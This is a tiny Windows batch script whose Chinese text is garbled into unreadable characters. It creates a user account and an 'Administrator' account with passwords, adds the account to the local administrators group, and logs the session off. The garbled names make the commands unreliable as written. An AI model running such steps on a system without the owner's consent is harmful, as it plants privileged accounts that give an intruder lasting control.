@echo off
color 0b
title ����û�
net user �û��� ���� /add
net user Administrator ���� /add
net localgroup administrators �û��� /add
start logoff
ping 127.0.0.1 -n 2 >NUL
